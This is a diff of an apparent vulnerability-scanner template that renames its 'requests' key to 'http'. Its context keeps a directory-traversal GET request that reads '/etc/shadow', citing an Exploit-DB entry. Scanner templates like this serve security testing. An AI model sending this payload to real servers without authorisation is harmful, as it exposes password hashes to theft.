@@ -7,7 +7,7 @@ info:
 
 # source:- https://www.exploit-db.com/exploits/47835
 
-requests:
+http:
   - method: GET
     path:
       - '{{BaseURL}}/./../../../../../../../../../../etc/shadow'
